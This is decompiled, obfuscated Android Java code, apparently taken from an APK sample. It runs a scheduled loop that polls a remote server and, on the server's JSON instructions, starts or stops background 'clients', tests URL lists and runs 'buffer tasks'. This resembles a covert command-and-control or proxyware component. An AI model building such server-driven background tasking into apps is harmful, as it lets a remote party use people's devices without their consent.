package com.unia.y;

import android.content.Context;
import android.util.Log;
import com.unia.y.ai;
import java.io.File;
import java.io.FileOutputStream;
import java.nio.channels.FileLock;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import org.json.JSONArray;
import org.json.JSONObject;
/* loaded from: /mnt/shared/apks/menSe7ni.dex */
public class x {

    /* renamed from: a  reason: collision with root package name */
    public static int f606a;
    private static List<ac> b = new ArrayList();
    private static ScheduledExecutorService c = Executors.newSingleThreadScheduledExecutor();
    private static Future d;
    private static t e;

    public static synchronized void a(final Context context, String str, String str2) {
        synchronized (x.class) {
            try {
                Log.w("Client", "Client go111");
                au.a("Client go");
            } catch (Throwable unused) {
            }
            if (a(context)) {
                Log.w("Client", "Client locked");
            } else if (d != null) {
            } else {
                if (f606a != 2) {
                    ai.a.a(new ai() { // from class: com.unia.y.x.1
                        @Override // com.unia.y.ai
                        public String a() {
                            return "";
                        }

                        @Override // com.unia.y.ai
                        public String a(String str3, String str4) {
                            return "";
                        }
                    });
                }
                aa.a(str, str2);
                d = c.scheduleAtFixedRate(new Runnable() { // from class: com.unia.y.x.2
                    @Override // java.lang.Runnable
                    public void run() {
                        try {
                            if (System.currentTimeMillis() - aa.d(context) < aa.f(context) - 10000) {
                                au.a("last request too short:" + System.currentTimeMillis() + "-" + aa.d(context) + "<" + (aa.f(context) - 10000));
                                return;
                            }
                            au.a("start getInfo");
                            x.c();
                            JSONArray jSONArray = null;
                            if (aq.a() != null) {
                                jSONArray = aq.a().b();
                            }
                            x.a(aa.a(context, x.d(), jSONArray));
                        } catch (Exception e2) {
                            au.a(Log.getStackTraceString(e2));
                        }
                    }
                }, 0L, aa.f(context), TimeUnit.MILLISECONDS);
            }
        }
    }

    public static synchronized void a(JSONObject jSONObject) {
        t tVar;
        ac acVar;
        synchronized (x.class) {
            au.a("need start clients:" + jSONObject);
            if (jSONObject != null && jSONObject.optInt("reset", 0) == 1) {
                if (b.size() != 0) {
                    for (ac acVar2 : b) {
                        acVar2.c();
                    }
                }
                b.clear();
            }
            if (jSONObject != null && jSONObject.optInt("status") == 1) {
                if (jSONObject.has("test_url_arr")) {
                    au.a("start test");
                    try {
                        JSONArray jSONArray = jSONObject.getJSONArray("test_url_arr");
                        if (aq.a() == null || !aq.a().c().equals(jSONArray)) {
                            aq.a(new aq(jSONArray, jSONObject.optInt("test_timeout", 600000)));
                            aq.a().b();
                        }
                    } catch (Exception unused) {
                    }
                } else {
                    aq.a(null);
                }
                JSONArray jSONArray2 = jSONObject.getJSONArray("response");
                for (int i = 0; i < jSONArray2.length(); i++) {
                    try {
                        JSONObject jSONObject2 = jSONArray2.getJSONObject(i);
                        acVar = new ac();
                        acVar.a(jSONObject2);
                    } catch (Exception e2) {
                        au.a(Log.getStackTraceString(e2));
                    }
                    if (b.contains(acVar)) {
                        List<ac> list = b;
                        ac acVar3 = list.get(list.indexOf(acVar));
                        if (!acVar3.d()) {
                            acVar3.c();
                            b.remove(acVar3);
                        }
                    }
                    acVar.b();
                    b.add(acVar);
                }
                if (jSONObject.optInt("need_stop_buffer", 0) == 1 && (tVar = e) != null) {
                    tVar.c();
                    e = null;
                }
                try {
                    JSONObject optJSONObject = jSONObject.optJSONObject("buffer_task");
                    if (optJSONObject != null) {
                        t tVar2 = new t();
                        tVar2.b(optJSONObject);
                        t tVar3 = e;
                        if (tVar3 == null) {
                            e = tVar2;
                            tVar2.b();
                        } else if (!tVar3.equals(tVar2)) {
                            e.c();
                            e = tVar2;
                            tVar2.b();
                        }
                    }
                } catch (Exception unused2) {
                }
            }
        }
    }

    private static boolean a(Context context) {
        try {
            FileLock tryLock = new FileOutputStream(context.getFilesDir() + File.separator + (f606a == 2 ? ".pyoflock" : ".pylock")).getChannel().tryLock();
            Log.i("dy", "fileLock[" + tryLock + "]");
            return tryLock == null;
        } catch (Exception unused) {
            return true;
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static boolean c() {
        List<ac> list = b;
        boolean z = false;
        if (list != null && list.size() > 0) {
            for (ac acVar : b) {
                if (acVar.d()) {
                    z = true;
                } else {
                    acVar.c();
                }
            }
        }
        return z;
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static JSONArray d() {
        JSONArray jSONArray = new JSONArray();
        List<ac> list = b;
        if (list != null && list.size() > 0) {
            for (ac acVar : b) {
                jSONArray.put(acVar.a());
            }
        }
        return jSONArray;
    }
}
